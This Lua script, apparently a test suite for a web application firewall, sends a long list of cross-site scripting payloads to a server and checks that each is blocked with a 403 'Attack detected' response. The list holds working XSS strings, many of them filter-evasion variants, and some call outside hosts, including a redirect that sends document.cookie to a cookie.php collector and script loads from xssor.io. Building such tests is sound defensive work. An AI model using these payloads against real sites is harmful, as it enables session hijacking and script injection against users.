local subname = ""
-- 发送 GET 请求
local response = nil

local test_cases = [[
'';!--"<script>alert(0);</script>=&{()}
'';!--"<script>alert(0);</script>=&{(alert(1))}
`><script>alert(0)</script>
<script>a=eval;b=alert;a(b(/i/.source));</script>
<code onmouseover=a=eval;b=alert;a(b(/g/.source));>HI</code>
<script src=http://xssor.io/xss.js></SCRIPT>
<script>location.href='http://127.0.0.1:8088/cookie.php?cookie='+escape(document.cookie);</script>
'"><img onerror=alert(0) src=><"'
<img src=&#04jav&#13;ascr&#09;ipt:al&#13;ert(0)>
<img src=&#04jav&#13;ascr&#09;ipt:i="x=document.createElement('script');x.src='http://xssor.io/xn.js';x.defer=true;document.getElementsByTagName('head')[0].appendChild(x)";execScript(i)>
<img src=&#04jav&#13;ascr&#09;ipt:i="x=docu&#13;ment.createElement('\u0053\u0043\u0052\u0049\u0050\u0054');x.src='http://xssor.io/xn.js';x.defer=true;doc&#13;ument.getElementsByTagName('head')[0].appendChild(x)";execScri&#13;pt(i)>
<iframe src=http://www.baidu.com/></iframe>
<body background=javascript:alert(/xss/)></body>
body{xxx:expression(eval(String.fromCharCode(105,102,40,33,119,105,110,100,111,119,46,120,41,123,97,108,101,114,116,40,39,120,115,115,39,41,59,119,105,110,100,111,119,46,120,61,49,59,125)))}
<style>body{width:expression(parent.document.write(unescape('%3Cscript%20src%3Dhttp%3A//xssor.io/phishing/%3E%3C/script%3E')));}</style>
body{background:url("javascript:alert('xss')")}
<style>@im\port'\ja\vasc\ript:alert("xss")';</style>
<a onclick="i=createElement('iframe');i.src='javascript:alert(/xss/)';x=parentNode;x.appendChild(i);" href="#">Test</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4=">Test</a>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<div style="-moz-binding:url(http://xssor.io/0.xml#xss);x:expression((window.r!=1)?eval('x=String.fromCharCode;scr=document.createElement(x(115,99,114,105,112,116));scr.setAttribute(x(115,114,99),x(104,116,116,112,58,47,47,119,119,119,46,48,120,51,55,46,99,111,109,47,48,46,106,115));document.getElementById(x(105,110,106,101,99,116)).appendChild(scr);window.r=1;'):1);"id="inject">
javascript:document.scripts[0].src='http://127.0.0.1/yy.js';void(0);
<a href="javascript:x=open('http://www.xiaonei.com/');setInterval (function(){try{x.frames[0].location={toString:function(){return%20'http://xssor.io/Project/poc/docshell.html';}}}catch(e){}},3000);void(1);">Test</a>
<script/onreadystatechange=alert(1)>
<script/src=data:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,alert(4)></script>
javascript:document.cookie=window.prompt("edit cookie:",document.cookie);void(0);
<input id=11 name=s value=`aa`onclick=alert(/xss/)>
<input value:aa/onclick=alert(/xss/)>
<li style=list-style:url() onerror=alert(1)>
<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)></div>
<head><base href="javascript://"></head><body><a href="/. /,alert(1)//#">XXX</a></body>
<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
<div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
<div style=width:1px;filter:glow onfilterchange=alert(1)>x
<title onpropertychange=alert(1)></title><title title=>
<!--[if]><script>alert(1)</script --> <!--[if<img src=x onerror=alert(1)//]> -->
<!--<img src="--><img src=x onerror=alert(1)//">
<comment><img src="</comment><img src=x onerror=alert(1))//">
<![><img src="]><img src=x onerror=alert(1)//">
<style><img src="</style><img src=x onerror=alert(1)//">
<b <script>alert(1)</script>0
<x '="foo"><x foo='><img src=x onerror=alert(1)//'>
<? foo="><script>alert(1)</script>">
<! foo="><script>alert(1)</script>">
</ foo="><script>alert(1)</script>">
<? foo="><x foo='?><script>alert(1)</script>'>">
<% foo><x foo="%><script>alert(1)</script>">
<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
<svg/onload=alert(1)>
<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
<video><source onerror="alert(1)">
<iframe srcdoc="<svg onload=alert(1)&nvgt;"></iframe>
<frameset onload=alert(1)>
<!--<img src="--><img src=x onerror=alert(1)//">
<style><img src="</style><img src=x onerror=alert(1)//">
<title><img src="</title><img src=x onerror=alert(1)//"> // by evilcos
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
<frameset onpageshow="alert(1)">
<body onpageshow="alert(1)">
<script>`</div><div>`-alert(123)</script>
<script>`</div><div>`+alert(123)</script>
<script>`</div><div>`/alert(123)</script>
<script>`</div><div>`%alert(123)</script>
<script>`</div><div>`==alert(123)</script>
<script>`</div><div>`/=alert(123)</script> # Only Edge
<script>`</div><div>`*=alert(123)</script> # Only Edge
<img/src=="x onerror=alert(1)//">
<div/style=="x onclick=alert(1)//">XSS'OR
<div style=behavior:url(" onclick=alert(1)//">XSS'OR
<div style=x:x(" onclick=alert(1)//">XSS'OR
<div> <a href=/**/alert(1)>XSS</a><base href="javascript:\ </div><div id="x"></div>
<div><base href="javascript:/"><a href=/**/alert(1)>XSS</a></div>
<div><base href="javascript:\"><a href=/**/alert(1)>XSS</a></div>
<div><base/href=javascript:/><a href=/*'"+-/%~.,()^&$#@!*/alert(1)>XSS</a></div>
<noembed><img src="</noembed><iframe onload=alert(1)>" /></noembed>
]]
for line in string.gmatch(test_cases, "([^\n]*)\n?") do
    if line ~= "" then
        subname = "XSS TEST - "..line
    response = client:get(url .."/","link="..line)

    assertAll(response.body, "Attack detected", response.status, "403 Forbidden", TEST_CASE..subname)
    end
end

